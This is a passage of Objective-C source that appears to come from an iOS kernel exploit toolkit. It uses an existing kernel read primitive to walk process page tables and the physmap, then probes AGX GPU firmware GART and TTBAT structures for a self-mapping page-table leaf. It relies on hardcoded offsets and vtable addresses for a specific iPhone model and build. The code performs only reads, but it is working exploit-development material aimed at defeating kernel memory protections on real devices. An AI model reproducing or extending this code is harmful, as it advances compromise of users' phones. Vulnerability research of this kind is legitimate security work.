        if (reasonOut != NULL) *reasonOut = "e3-live-leaf-entry-invalid";
        return false;
    }
    path->leafPhysical = path->leafEntry & CNDUatE1EntryPaddrMask;
    if (path->leafPhysical == 0 ||
        (path->leafPhysical & (CNDUatE1PageSize - 1)) != 0) {
        if (reasonOut != NULL) *reasonOut = "e3-live-leaf-output-invalid";
        return false;
    }
    path->leafInPhysmap = CNDUatE2PhysicalToKernelVirtual(
        walker, path->leafPhysical, &path->leafVirtual);

    bool framesDistinct = path->rootPhysical != path->directoryPhysical &&
        path->rootPhysical != path->tablePhysical &&
        path->directoryPhysical != path->tablePhysical;
    if (!framesDistinct || !CNDUatE2WalkerAnchorsStable(api, walker)) {
        if (reasonOut != NULL) {
            *reasonOut = framesDistinct
                ? "e3-live-path-walker-anchors-changed"
                : "e3-live-path-frames-not-distinct";
        }
        return false;
    }
    path->validated = true;
    return true;
}

static bool CNDUatE2PrepareCheckedWalker(
    NSMutableDictionary<NSString *, id> *report, const CNDUatE1API *api,
    uint64_t slide, uint64_t selfTask, uint64_t firstCandidate,
    uint64_t lastCandidate, CNDUatE2CheckedWalker *walker,
    NSString **reasonOut)
{
    static const CNDUatE2PageTableLevel expected[4] = {
        {0},
        {UINT64_C(0x1000000000), UINT64_C(0xfffffffff), 36,
         UINT64_C(0x7ff000000000), 1, 2, 0},
        {UINT64_C(0x2000000), UINT64_C(0x1ffffff), 25,
         UINT64_C(0xffe000000), 1, 2, 0},
        {UINT64_C(0x4000), UINT64_C(0x3fff), 14,
         UINT64_C(0x1ffc000), 3, 2, 2},
    };
    if (walker == NULL || api == NULL || firstCandidate == 0 ||
        lastCandidate < firstCandidate ||
        (firstCandidate & (CNDUatE1PageSize - 1)) != 0 ||
        (lastCandidate & (CNDUatE1PageSize - 1)) != 0) {
        if (reasonOut != NULL) *reasonOut = @"invalid-reuse-walker-input";
        return false;
    }
    memset(walker, 0, sizeof(*walker));
    walker->selfTask = selfTask;

    uint64_t raw = 0;
    if (!CNDUatE1Read64(api, selfTask + 0x28, &raw) ||
        !CNDUatE2CheckedKernelPointer(api, raw, &walker->map)) {
        if (reasonOut != NULL) *reasonOut = @"reuse-self-task-map-invalid";
        return false;
    }
    if (!CNDUatE1Read64(api, walker->map + 0x40, &raw) ||
        !CNDUatE2CheckedKernelPointer(api, raw, &walker->pmap)) {
        if (reasonOut != NULL) *reasonOut = @"reuse-vm-map-pmap-invalid";
        return false;
    }
    if (!CNDUatE1Read64(api, walker->pmap + 0x0, &raw) ||
        !CNDUatE2CheckedKernelPointer(api, raw, &walker->rootTable) ||
        !CNDUatE1Read64(api, walker->pmap + 0x8, &walker->rootPhysical) ||
        !CNDUatE1Read64(api, walker->pmap + 0x10, &walker->minimum) ||
        !CNDUatE1Read64(api, walker->pmap + 0x18, &walker->maximum) ||
        !CNDUatE1Read64(api, walker->pmap + 0x20, &raw) ||
        !CNDUatE2CheckedKernelPointer(api, raw, &walker->attributes) ||
        walker->rootPhysical == 0 ||
        (walker->rootPhysical & 0x7f) != 0 ||
        firstCandidate < walker->minimum || lastCandidate >= walker->maximum) {
        if (reasonOut != NULL) *reasonOut = @"reuse-pmap-root-invalid";
        return false;
    }

    uint64_t gVirtBaseAddress = 0;
    uint64_t gPhysBaseAddress = 0;
    uint64_t gPhysSizeAddress = 0;
    if (!CNDUatE2AddSlide(CNDUatE1GVirtBase, slide, &gVirtBaseAddress) ||
        !CNDUatE2AddSlide(CNDUatE2KernelGPhysBase, slide,
                          &gPhysBaseAddress) ||
        !CNDUatE2AddSlide(CNDUatE1GPhysSize, slide, &gPhysSizeAddress) ||
        !CNDUatE2AddSlide(CNDUatE2KernelPhysmapRangeState, slide,
                          &walker->rangeStateAddress) ||
        !CNDUatE2AddSlide(CNDUatE2KernelPhysmapRangeCountPointer, slide,
                          &walker->rangeCountPointerAddress) ||
        !CNDUatE2AddSlide(CNDUatE2KernelPhysmapRangeRecordsPointer, slide,
                          &walker->rangeRecordsPointerAddress)) {
        if (reasonOut != NULL) *reasonOut = @"reuse-physmap-symbol-overflow";
        return false;
    }

    uint32_t rangeStateWord = 0;
    uint64_t countRaw = 0;
    uint64_t recordsRaw = 0;
    if (!CNDUatE1Read64(api, gVirtBaseAddress, &walker->gVirtBase) ||
        !CNDUatE1Read64(api, gPhysBaseAddress, &walker->gPhysBase) ||
        !CNDUatE1Read64(api, gPhysSizeAddress, &walker->gPhysSize) ||
        !CNDUatE1Read32(api, walker->rangeStateAddress, &rangeStateWord) ||
        !CNDUatE1Read64(api, walker->rangeCountPointerAddress, &countRaw) ||
        !CNDUatE1Read64(api, walker->rangeRecordsPointerAddress, &recordsRaw) ||
        !CNDUatE2CheckedKernelPointer(
            api, countRaw, &walker->rangeCountAddress) ||
        !CNDUatE2CheckedKernelPointer(
            api, recordsRaw, &walker->rangeRecordsAddress) ||
        !CNDUatE1Read32(api, walker->rangeCountAddress, &walker->rangeCount)) {
        if (reasonOut != NULL) *reasonOut = @"reuse-physmap-anchor-read-failed";
        return false;
    }
    walker->rangeState = (uint8_t)rangeStateWord;
    if ((walker->rangeState & 1U) == 0 || walker->rangeCount == 0 ||
        walker->rangeCount > CNDUatE2PhysmapMaximumRanges ||
        walker->gPhysBase == 0 ||
        (walker->gPhysBase & (CNDUatE1PageSize - 1)) != 0 ||
        walker->gPhysSize < UINT64_C(0x10000000) ||
        walker->gPhysSize > UINT64_C(0x10000000000) ||
        !CNDUatE2CheckedKernelPointer(api, walker->gVirtBase, NULL)) {
        if (reasonOut != NULL) *reasonOut = @"reuse-physmap-anchor-shape-failed";
        return false;
    }

    CNDUatE2PhysmapRangeRecord rawRanges[CNDUatE2PhysmapMaximumRanges] = {0};
    if (!CNDUatE1Read(api, walker->rangeRecordsAddress, rawRanges,
                      walker->rangeCount * sizeof(rawRanges[0]))) {
        if (reasonOut != NULL) *reasonOut = @"reuse-physmap-ranges-read-failed";
        return false;
    }
    NSMutableArray<NSDictionary<NSString *, id> *> *rangeReport =
        [NSMutableArray arrayWithCapacity:walker->rangeCount];
    for (NSUInteger index = 0; index < walker->rangeCount; index++) {
        CNDUatE2PhysmapRangeRecord range = rawRanges[index];
        uint64_t length = (uint64_t)range.pageCount << 14;
        if (range.physicalAddress == 0 || range.pageCount == 0 ||
            (range.physicalAddress & (CNDUatE1PageSize - 1)) != 0 ||
            (range.virtualAddress & (CNDUatE1PageSize - 1)) != 0 ||
            !CNDUatE2CheckedKernelPointer(api, range.virtualAddress, NULL) ||
            length > UINT64_MAX - range.physicalAddress ||
            length > UINT64_MAX - range.virtualAddress) {
            if (reasonOut != NULL) {
                *reasonOut = @"reuse-physmap-range-predicate-failed";
            }
            return false;
        }
        walker->ranges[index] = (CNDUatE2PTOVEntry){
            .physicalAddress = range.physicalAddress,
            .virtualAddress = range.virtualAddress,
            .length = length,
        };
        [rangeReport addObject:@{
            @"index": @(index),
            @"physicalAddress": CNDUatE1Hex(range.physicalAddress),
            @"virtualAddress": CNDUatE1Hex(range.virtualAddress),
            @"pageCount": @(range.pageCount),
            @"length": CNDUatE1Hex(length),
        }];
    }

    uint64_t rootFromPhysical = 0;
    if (!CNDUatE2PhysicalToKernelVirtual(
            walker, walker->rootPhysical, &rootFromPhysical) ||
        rootFromPhysical != walker->rootTable) {
        if (reasonOut != NULL) *reasonOut = @"reuse-pmap-root-crosscheck-failed";
        return false;
    }

    uint32_t rootLevel = 0;
    uint32_t maximumLevel = 0;
    uint64_t pageSize = 0;
    uint64_t pageShift = 0;
    uint32_t geometryID = 0;
    if (!CNDUatE1Read64(api, walker->attributes + 0x0, &raw) ||
        !CNDUatE2CheckedKernelPointer(api, raw, &walker->levelInfo) ||
        !CNDUatE1Read32(api, walker->attributes + 0x40, &rootLevel) ||
        !CNDUatE1Read32(api, walker->attributes + 0x48, &maximumLevel) ||
        !CNDUatE1Read64(api, walker->attributes + 0x58, &pageSize) ||
        !CNDUatE1Read64(api, walker->attributes + 0x60, &pageShift) ||
        !CNDUatE1Read32(api, walker->attributes + 0x68, &geometryID) ||
        !CNDUatE1Read64(api, walker->attributes + 0x70,
                        &walker->virtualAddressMask) ||
        rootLevel != 1 || maximumLevel != 3 ||
        pageSize != CNDUatE1PageSize || pageShift != 14 ||
        walker->virtualAddressMask != UINT64_C(0x7fffffffff) ||
        (firstCandidate & ~walker->virtualAddressMask) != 0 ||
        (lastCandidate & ~walker->virtualAddressMask) != 0) {
        if (reasonOut != NULL) *reasonOut = @"reuse-page-table-geometry-failed";
        return false;
    }
    for (unsigned level = 1; level <= 3; level++) {
        if (!CNDUatE1Read(api,
                          walker->levelInfo +
                              level * sizeof(CNDUatE2PageTableLevel),
                          &walker->levels[level],
                          sizeof(CNDUatE2PageTableLevel)) ||
            memcmp(&walker->levels[level], &expected[level],
                   sizeof(expected[level])) != 0) {
            if (reasonOut != NULL) {
                *reasonOut = @"reuse-page-table-level-layout-failed";
            }
            return false;
        }
    }

    if (!CNDUatE2WalkerAnchorsStable(api, walker)) {
        if (reasonOut != NULL) *reasonOut = @"reuse-physmap-anchors-unstable";
        return false;
    }

    report[@"reuseWalker"] = @{
        @"source": @"CNDHailMaryProbe-23A341-data-only-walker-checked-read-port",
        @"selfTask": CNDUatE1Hex(walker->selfTask),
        @"taskMapOffset": @0x28,
        @"map": CNDUatE1Hex(walker->map),
        @"vmMapPmapOffset": @0x40,
        @"pmap": CNDUatE1Hex(walker->pmap),
        @"rootTable": CNDUatE1Hex(walker->rootTable),
        @"rootPhysical": CNDUatE1Hex(walker->rootPhysical),
        @"minimum": CNDUatE1Hex(walker->minimum),
        @"maximum": CNDUatE1Hex(walker->maximum),
        @"attributes": CNDUatE1Hex(walker->attributes),
        @"levelInfo": CNDUatE1Hex(walker->levelInfo),
        @"geometryID": @(geometryID & 0xffU),
        @"pageSize": @(pageSize),
        @"virtualAddressMask": CNDUatE1Hex(walker->virtualAddressMask),
        @"gVirtBase": CNDUatE1Hex(walker->gVirtBase),
        @"gPhysBase": CNDUatE1Hex(walker->gPhysBase),
        @"gPhysSize": CNDUatE1Hex(walker->gPhysSize),
        @"rangeCount": @(walker->rangeCount),
        @"ranges": rangeReport,
        @"kernelReadAPI": @"kexploit_krw_read_checked",
        @"kernelWriteCount": @0,
        @"preparedBeforeRetirement": @YES,
    };
    CNDUatE1Persist(report);
    return true;
}

#pragma mark - AGX firmware self-map discriminator

static bool CNDUatAGXRunDropMapGartSelfMapRoute(
    NSMutableDictionary<NSString *, id> *report, const CNDUatE1API *api,
    uint64_t slide, uint64_t selfTask, uint64_t accelerator,
    NSString **reasonOut)
{
    if (reasonOut != NULL) *reasonOut = nil;
    mach_vm_address_t walkerReservation = 0;
    bool walkerReservationAllocated = false;
    bool observed = false;
    NSString *reason = @"agx-selfmap-unknown";
    NSMutableArray<NSDictionary<NSString *, id> *> *contextReports = nil;
    NSDictionary<NSString *, id> *ttbatSummary = nil;
    NSString *walkerReason = nil;
    NSMutableArray<NSDictionary<NSString *, id> *> *walkReports = nil;
    report[@"agxDropMapGartSelfMapGateReached"] = @NO;
    CNDUatE1Persist(report);

    CNDUatE1Progress(report, @"agx-selfmap.drop",
                     @"read-stable-accelerator-drop-state",
                     accelerator + CNDUatAGXDropState);
    uint64_t dropRaw = 0;
    if (!CNDUatE2ReadStable64(
            api, accelerator + CNDUatAGXDropState, &dropRaw)) {
        reason = @"agx-selfmap-drop-state-read-or-stability-failed";
        goto done;
    }
    uint64_t drop = CNDUatE1CanonicalPointer(api, dropRaw);
    bool dropShapePassed = drop != 0 && (drop & 0x7) == 0;
    report[@"agxDropStatePredicate"] = @{
        @"source": @"validated AGXAccelerator +0x10a18; exact DropMDSID "
                    "consumer 0x8aa0c74 on iPhone17,2 23A341",
        @"raw": CNDUatE1Hex(dropRaw),
        @"canonical": CNDUatE1Hex(drop),
        @"stableDoubleRead": @YES,
        @"aligned8": @((drop & 0x7) == 0),
        @"passed": @(dropShapePassed),
    };
    CNDUatE1Persist(report);
    if (!dropShapePassed) {
        reason = @"agx-selfmap-drop-state-shape-failed";
        goto done;
    }

    CNDUatE1Progress(report, @"agx-selfmap.drop",
                     @"read-drop-gpu-offset",
                     drop + CNDUatAGXDropGPUOffset);
    uint32_t gpuOffset = UINT32_MAX;
    if (!CNDUatE1Read32(api, drop + CNDUatAGXDropGPUOffset, &gpuOffset)) {
        reason = @"agx-selfmap-drop-gpu-offset-read-failed";
        goto done;
    }
    bool gpuOffsetPassed = gpuOffset <= CNDUatE1PageSize - sizeof(uint64_t);
    report[@"agxDropGPUOffsetPredicate"] = @{
        @"address": CNDUatE1Hex(drop + CNDUatAGXDropGPUOffset),
        @"value": @(gpuOffset),
        @"maximum": @(CNDUatE1PageSize - sizeof(uint64_t)),
        @"source": @"DropMDSID target field +0x540",
        @"passed": @(gpuOffsetPassed),
    };
    CNDUatE1Persist(report);
    if (!gpuOffsetPassed) {
        reason = @"agx-selfmap-drop-gpu-offset-predicate-failed";
        goto done;
    }

    CNDUatE1Progress(report, @"agx-selfmap.owner",
                     @"read-stable-drop-owner",
                     drop + CNDUatAGXDropOwner);
    uint64_t ownerRaw = 0;
    if (!CNDUatE2ReadStable64(
            api, drop + CNDUatAGXDropOwner, &ownerRaw)) {
        reason = @"agx-selfmap-owner-read-or-stability-failed";
        goto done;
    }
    uint64_t owner = CNDUatE1CanonicalPointer(api, ownerRaw);
    report[@"agxDropOwner"] = CNDUatE1PointerReport(api, ownerRaw);
    CNDUatE1Persist(report);
    if (owner == 0 || (owner & 0x7) != 0 ||
        !CNDUatE1ValidateLifecycleVptr(
            report, api, @"agx-selfmap.owner", owner,
            CNDUatAGXInternalResourceVtable, slide,
            @"DropMDSID 0x8aa0c78 loads drop+0x17400; physical C42 "
             "observed exact AGXInternalResource vptr slide+0x7cdbfd8; "
             "constructor 0x8b07f28 installs that signed vptr", NULL)) {
        reason = @"agx-selfmap-owner-vptr-predicate-failed";
        goto done;
    }

    CNDUatE1Progress(report, @"agx-selfmap.map",
                     @"read-stable-owner-map", owner + CNDUatAGXOwnerMap);
    uint64_t mapRaw = 0;
    if (!CNDUatE2ReadStable64(
            api, owner + CNDUatAGXOwnerMap, &mapRaw)) {
        reason = @"agx-selfmap-map-read-or-stability-failed";
        goto done;
    }
    uint64_t map = CNDUatE1CanonicalPointer(api, mapRaw);
    report[@"agxDropMap"] = CNDUatE1PointerReport(api, mapRaw);
    CNDUatE1Persist(report);
    if (map == 0 || (map & 0x7) != 0 ||
        !CNDUatE1ValidateLifecycleVptr(
            report, api, @"agx-selfmap.map", map,
            CNDUatAGXSecureMemoryMapVtable, slide,
            @"DropMDSID 0x8aa0c80 loads owner+0x58 on 23A341; exact "
             "AGXSecureMemoryMap allocator installs slide+0x7cdebf8",
            NULL)) {
        reason = @"agx-selfmap-map-vptr-predicate-failed";
        goto done;
    }

    CNDUatE1Progress(report, @"agx-selfmap.map",
                     @"read-stable-map-gpu-base",
                     map + CNDUatAGXMapGPUBase);
    uint64_t mapGPUBase = 0;
    if (!CNDUatE2ReadStable64(
            api, map + CNDUatAGXMapGPUBase, &mapGPUBase)) {
        reason = @"agx-selfmap-map-gpu-base-read-or-stability-failed";
        goto done;
    }
    bool mapGPUBasePassed =
        (mapGPUBase & UINT64_C(0xfffffc0000000000)) ==
            UINT64_C(0xfffffc0000000000);
    report[@"agxDropMapGPUBasePredicate"] = @{
        @"address": CNDUatE1Hex(map + CNDUatAGXMapGPUBase),
        @"value": CNDUatE1Hex(mapGPUBase),
        @"expectedRegion": @"0xfffffc0000000000/22",
        @"stableDoubleRead": @YES,
        @"passed": @(mapGPUBasePassed),
    };
    CNDUatE1Persist(report);
    if (!mapGPUBasePassed) {
        reason = @"agx-selfmap-map-gpu-base-predicate-failed";
        goto done;
    }

    CNDUatE1Progress(report, @"agx-selfmap.map-gart",
                     @"read-stable-map-gart", map + CNDUatAGXMapGart);
    uint64_t mapGartRaw = 0;
    if (!CNDUatE2ReadStable64(
            api, map + CNDUatAGXMapGart, &mapGartRaw)) {
        reason = @"agx-selfmap-map-gart-read-or-stability-failed";
        goto done;
    }
    uint64_t mapGart = CNDUatE1CanonicalPointer(api, mapGartRaw);
    report[@"agxDropMapGart"] =
        CNDUatE1PointerReport(api, mapGartRaw);
    CNDUatE1Persist(report);
    if (mapGart == 0 || (mapGart & 0x7) != 0 ||
        !CNDUatE1ValidateLifecycleVptr(
            report, api, @"agx-selfmap.map-gart", mapGart,
            CNDUatE1GartVtable, slide,
            @"IOGPUMemoryMap init 0xa537134 retains x2 at map+0x20; "
             "AGXSecureMemoryMap methods consume that field through GART "
             "virtual slots; exact AGXSecureGart vptr slide+0x7cd9148",
            NULL)) {
        reason = @"agx-selfmap-map-gart-vptr-predicate-failed";
        goto done;
    }

    contextReports = [NSMutableArray array];
    uint32_t contextIDs[CNDUatE1GartContextIDCount] = {0};
    NSUInteger activeContextCount = 0;
    for (NSUInteger domain = 0;
         domain < CNDUatE1GartContextIDCount; domain++) {
        uint64_t field = mapGart + CNDUatE1GartContextID0 +
            domain * sizeof(uint32_t);
        CNDUatE1Progress(report, @"agx-selfmap.map-gart-context",
                         @"read-context-id", field);
        uint32_t contextID = UINT32_MAX;
        if (!CNDUatE1Read32(api, field, &contextID)) {
            reason = @"agx-selfmap-context-id-read-failed";
            goto done;
        }
        bool sentinel = contextID == UINT32_MAX;
        bool rangePassed = sentinel || contextID < CNDUatE1TTBATEntries;
        contextIDs[domain] = contextID;
        if (!sentinel) activeContextCount++;
        [contextReports addObject:@{
            @"domain": @(domain),
            @"domainName": CNDUatE1GartDomainNames[domain],
            @"fieldAddress": CNDUatE1Hex(field),
            @"raw": [NSString stringWithFormat:@"0x%08x", contextID],
            @"contextID": sentinel ? [NSNull null] : @(contextID),
            @"active": @(!sentinel),
            @"rangePassed": @(rangePassed),
        }];
        report[@"agxDropMapGartContexts"] = contextReports;
        CNDUatE1Persist(report);
        if (!rangePassed) {
            reason = @"agx-selfmap-context-id-range-failed";
            goto done;
        }
    }
    report[@"agxDropMapActiveContextCount"] = @(activeContextCount);
    CNDUatE1Persist(report);
    if (activeContextCount == 0) {
        reason = @"agx-selfmap-no-active-map-gart-context";
        goto done;
    }

    uint64_t readyAddress = CNDUatE1IOUATMapsReady + slide;
    CNDUatE1Progress(report, @"agx-selfmap.ttbat", @"read-maps-ready",
                     readyAddress);
    uint8_t ready = 0;
    if (!CNDUatE1Read8(api, readyAddress, &ready)) {
        reason = @"agx-selfmap-ttbat-ready-read-failed";
        goto done;
    }
    report[@"ttbatMapsReadyPredicate"] = @{
        @"address": CNDUatE1Hex(readyAddress),
        @"value": @(ready),
        @"expected": @2,
        @"source": @"C26 IOUAT four-map publication latch",
        @"passed": @(ready == 2),
    };
    CNDUatE1Persist(report);
    if (ready != 2) {
        reason = @"agx-selfmap-ttbat-maps-not-ready";
        goto done;
    }

    uint64_t mapSlotAddress = CNDUatE1TTBATMapVA + slide;
    CNDUatE1Progress(report, @"agx-selfmap.ttbat",
                     @"read-retained-map-va", mapSlotAddress);
    uint64_t ttbatRaw = 0;
    if (!CNDUatE1Read64(api, mapSlotAddress, &ttbatRaw)) {
        reason = @"agx-selfmap-ttbat-map-va-read-failed";
        goto done;
    }
    uint64_t ttbat = CNDUatE1CanonicalPointer(api, ttbatRaw);
    bool ttbatPassed = ttbat != 0 && ttbatRaw == ttbat &&
        (ttbat & (CNDUatE1PageSize - 1)) == 0 &&
        sizeof(CNDUatE1TTBATSnapshot) <= CNDUatE1PageSize;
    report[@"ttbatMapPredicate"] = @{
        @"slotAddress": CNDUatE1Hex(mapSlotAddress),
        @"raw": CNDUatE1Hex(ttbatRaw),
        @"canonical": CNDUatE1Hex(ttbat),
        @"aligned16K": @((ttbat & (CNDUatE1PageSize - 1)) == 0),
        @"activeBytes": @(sizeof(CNDUatE1TTBATSnapshot)),
        @"staticLifetimeWitness":
            @"C26-E1-TTBAT-EL1-MAP-LIFETIME-TRACE-20261105",
        @"passed": @(ttbatPassed),
    };
    CNDUatE1Persist(report);
    if (!ttbatPassed) {
        reason = @"agx-selfmap-ttbat-map-predicate-failed";
        goto done;
    }

    CNDUatE1TTBATSnapshot ttbatSnapshot = {0};
    if (!CNDUatE1SnapshotTTBAT(
            report, api, @"agx-selfmap.ttbat-snapshot", ttbat,
            &ttbatSnapshot, &ttbatSummary)) {
        reason = @"agx-selfmap-ttbat-read-or-shape-failed";
        goto done;
    }
    report[@"agxDropMapGartTTBATSnapshot"] = ttbatSummary ?: @{};
    report[@"tableReached"] = @YES;
    CNDUatE1Persist(report);

    kern_return_t allocationKR = mach_vm_allocate(
        mach_task_self(), &walkerReservation, CNDUatE1PageSize,
        VM_FLAGS_ANYWHERE);
    walkerReservationAllocated = allocationKR == KERN_SUCCESS &&
        walkerReservation != 0;
    report[@"agxSelfMapWalkerReservation"] = @{
        @"allocationKR": CNDUatE1Hex((uint32_t)allocationKR),
        @"address": CNDUatE1Hex(walkerReservation),
        @"size": @(CNDUatE1PageSize),
        @"ownUserAllocation": @YES,
        @"kernelMemoryWrite": @NO,
        @"passed": @(walkerReservationAllocated &&
                      (walkerReservation & (CNDUatE1PageSize - 1)) == 0),
    };
    CNDUatE1Persist(report);
    if (!walkerReservationAllocated ||
        (walkerReservation & (CNDUatE1PageSize - 1)) != 0) {
        reason = @"agx-selfmap-walker-reservation-failed";
        goto done;
    }

    CNDUatE2CheckedWalker walker = {0};
    if (!CNDUatE2PrepareCheckedWalker(
            report, api, slide, selfTask, walkerReservation,
            walkerReservation, &walker, &walkerReason)) {
        reason = walkerReason ?: @"agx-selfmap-walker-prepare-failed";
        goto done;
    }
    (void)mach_vm_deallocate(
        mach_task_self(), walkerReservation, CNDUatE1PageSize);
    walkerReservationAllocated = false;
    walkerReservation = 0;

    uint64_t stableOwnerMapRaw = 0;
    uint64_t stableMapGartRaw = 0;
    bool objectChainStable =
        CNDUatE2ReadStable64(
            api, owner + CNDUatAGXOwnerMap, &stableOwnerMapRaw) &&
        stableOwnerMapRaw == mapRaw &&
        CNDUatE2ReadStable64(
            api, map + CNDUatAGXMapGart, &stableMapGartRaw) &&
        stableMapGartRaw == mapGartRaw;
    report[@"agxDropMapGartPrewalkStabilityPredicate"] = @{
        @"ownerMapField": CNDUatE1Hex(owner + CNDUatAGXOwnerMap),
        @"expectedOwnerMap": CNDUatE1Hex(mapRaw),
        @"observedOwnerMap": CNDUatE1Hex(stableOwnerMapRaw),
        @"mapGartField": CNDUatE1Hex(map + CNDUatAGXMapGart),
        @"expectedMapGart": CNDUatE1Hex(mapGartRaw),
        @"observedMapGart": CNDUatE1Hex(stableMapGartRaw),
        @"stableDoubleReads": @YES,
        @"passed": @(objectChainStable),
    };
    CNDUatE1Persist(report);
    if (!objectChainStable) {
        reason = @"agx-selfmap-map-gart-chain-changed-before-walk";
        goto done;
    }

    walkReports = [NSMutableArray array];
    report[@"agxDropMapGartSelfMapGateReached"] = @YES;
    CNDUatE1Persist(report);
    bool seenContext[CNDUatE1TTBATEntries] = {false};
    NSUInteger attemptedContexts = 0;
    for (NSUInteger domain = 0;
         domain < CNDUatE1GartContextIDCount; domain++) {
        uint32_t contextID = contextIDs[domain];
        if (contextID == UINT32_MAX ||
            contextID >= CNDUatE1TTBATEntries || seenContext[contextID]) {
            continue;
        }
        seenContext[contextID] = true;
        attemptedContexts++;
        uint64_t root0Word = ttbatSnapshot.words[contextID * 2];
        uint64_t root1Word = ttbatSnapshot.words[contextID * 2 + 1];
        uint64_t root0 = root0Word & CNDUatE1TTBATPaddrMask;
        uint64_t root1 = root1Word & CNDUatE1TTBATPaddrMask;
        bool rootsPassed = (root0Word & 1) != 0 &&
            (root1Word & 1) != 0 && root0 != 0 && root1 != 0;
        NSMutableDictionary<NSString *, id> *walkReport = [@{
            @"domain": @(domain),
            @"contextID": @(contextID),
            @"candidateFullGPUVA": @"0xfffffc0001fc8000",
            @"candidateWalkVA": CNDUatE1Hex(CNDUatAGXFirmwareLeafSelfMap),
            @"root0Word": CNDUatE1Hex(root0Word),
            @"root1Word": CNDUatE1Hex(root1Word),
            @"root0Physical": CNDUatE1Hex(root0),
            @"root1Physical": CNDUatE1Hex(root1),
            @"rootsPassed": @(rootsPassed),
        } mutableCopy];
        [walkReports addObject:walkReport];
        report[@"agxDropMapGartSelfMapWalks"] = walkReports;
        CNDUatE1Persist(report);
        if (!rootsPassed) {
            walkReport[@"result"] = @"ttbat-root-pair-not-present";
            CNDUatE1Persist(report);
            continue;
        }

        CNDUatE3LivePath path = {0};
        const char *pathReason = NULL;
        bool pathPassed = CNDUatE3ResolveLivePath(
            api, &walker, CNDUatAGXFirmwareLeafSelfMap,
            root0, root1, &path, &pathReason);
        walkReport[@"pathValidated"] = @(pathPassed);
        walkReport[@"pathReason"] = pathReason != NULL
            ? [NSString stringWithUTF8String:pathReason] : @"none";
        if (!pathPassed) {
            walkReport[@"result"] = @"candidate-path-not-present";
            CNDUatE1Persist(report);
            continue;
        }

        bool indexShapePassed = path.rootIndex == 1 &&
            path.catalogueIndex == 0 && path.directoryIndex == 0 &&
            path.leafIndex == 0x7f2;
        bool selfMapPassed = indexShapePassed &&
            path.leafPhysical == path.tablePhysical;
        walkReport[@"rootIndex"] = @(path.rootIndex);
        walkReport[@"catalogueIndex"] = @(path.catalogueIndex);
        walkReport[@"directoryIndex"] = @(path.directoryIndex);
        walkReport[@"leafIndex"] = @(path.leafIndex);
        walkReport[@"rootPhysical"] = CNDUatE1Hex(path.rootPhysical);
        walkReport[@"rootEntry"] = CNDUatE1Hex(path.rootEntry);
        walkReport[@"directoryPhysical"] =
            CNDUatE1Hex(path.directoryPhysical);
        walkReport[@"directoryEntry"] =
            CNDUatE1Hex(path.directoryEntry);
        walkReport[@"tablePhysical"] = CNDUatE1Hex(path.tablePhysical);
        walkReport[@"leafEntry"] = CNDUatE1Hex(path.leafEntry);
        walkReport[@"leafPhysical"] = CNDUatE1Hex(path.leafPhysical);
        walkReport[@"indexShapePassed"] = @(indexShapePassed);
        walkReport[@"leafMapsOwnTablePhysical"] = @(selfMapPassed);
        walkReport[@"result"] = selfMapPassed
            ? @"validated-drop-map-gart-leaf-self-map"
            : @"validated-path-not-self-referential";
        CNDUatE1Persist(report);
        log_user("[AGX_SPTM] context=%u root1=0x%016llx "
                 "table=0x%016llx leaf=0x%016llx selfmap=%s\n",
                 contextID, (unsigned long long)root1,
                 (unsigned long long)path.tablePhysical,
                 (unsigned long long)path.leafPhysical,
                 selfMapPassed ? "yes" : "no");
        observed = observed || selfMapPassed;
    }

    report[@"agxDropMapGartSelfMapCandidate"] = @"0xfffffc0001fc8000";
    report[@"agxDropMapGartSelfMapLeafIndex"] = @0x7f2;
    report[@"agxDropMapGartSelfMapAttemptedContextCount"] =
        @(attemptedContexts);
    report[@"agxDropMapGartSelfMapObserved"] = @(observed);
    report[@"changedEntryCount"] = @0;
    report[@"kernelWriteUsed"] = @NO;
    report[@"kernelWriteCount"] = @0;
    CNDUatE1Persist(report);
    reason = observed
        ? @"validated-agx-drop-map-gart-leaf-self-map"
        : (attemptedContexts == 0
            ? @"agx-selfmap-no-ttbat-root-for-map-gart-context"
            : @"validated-agx-drop-map-gart-path-without-self-map");

done:
    if (walkerReservationAllocated) {
        (void)mach_vm_deallocate(
            mach_task_self(), walkerReservation, CNDUatE1PageSize);
    }
    if (reasonOut != NULL) *reasonOut = reason;
    report[@"agxDropMapGartSelfMapResult"] = reason;
    CNDUatE1Persist(report);
    return observed;
}

static bool CNDUatAGXRunBootstrapRootRoute(
    NSMutableDictionary<NSString *, id> *report, const CNDUatE1API *api,
    uint64_t slide, uint64_t accelerator, NSString **reasonOut)
{
    if (reasonOut != NULL) *reasonOut = nil;
    NSString *reason = @"agx-bootstrap-root-unknown";
    NSDictionary *firstSummary = nil;
    NSDictionary *finalSummary = nil;
    report[@"agxBootstrapRootAssociationGateReached"] = @NO;
    report[@"agxBootstrapRootPageWalkAttempted"] = @NO;
    report[@"targetFirmwareOutputTableVA"] = @"0xfffffc0000056f08";
    report[@"targetFirmwareOutputWalkIndices"] = @{
        @"normalizedPageVA": @"0x0000fc0000054000",
        @"root": @1,
        @"catalogue": @0,
        @"directory": @0,
        @"leaf": @21,
        @"pageOffset": @"0x2f08",
        @"walkAuthorized": @NO,
        @"stopReason": @"bootstrap-root-pages-lack-independent-EL1-mappedness-witness",
    };
    CNDUatE1Persist(report);

    uint64_t gartField = accelerator + CNDUatAGXAcceleratorBootstrapGart;
    CNDUatE1Progress(report, @"agx-bootstrap.gart",
                     @"read-stable-accelerator-bootstrap-gart", gartField);
    uint64_t gartRaw = 0;
    if (!CNDUatE2ReadStable64(api, gartField, &gartRaw)) {
        reason = @"agx-bootstrap-gart-read-or-stability-failed";
        goto done;
    }
    uint64_t gart = CNDUatE1CanonicalPointer(api, gartRaw);
    report[@"agxBootstrapGart"] = CNDUatE1PointerReport(api, gartRaw);
    CNDUatE1Persist(report);
    if (gart == 0 || (gart & 0x7) != 0 ||
        !CNDUatE1ValidateLifecycleVptr(
            report, api, @"agx-bootstrap.gart", gart,
            CNDUatE1GartVtable, slide,
            @"IOGPU start 0xa52a2b0 stores G17P +0x628 factory return at "
             "accelerator+0xd0; AGX start 0x8a7f88c retrieves the same "
             "field and calls AGXSecureGart registerContextID(0, domain3)",
            NULL)) {
        reason = @"agx-bootstrap-gart-vptr-predicate-failed";
        goto done;
    }

    uint64_t contextField = gart + CNDUatE1GartContextID0 +
        3 * sizeof(uint32_t);
    CNDUatE1Progress(report, @"agx-bootstrap.context",
                     @"read-domain3-context-id-twice", contextField);
    uint32_t contextID = UINT32_MAX;
    uint32_t stableContextID = UINT32_MAX;
    if (!CNDUatE1Read32(api, contextField, &contextID) ||
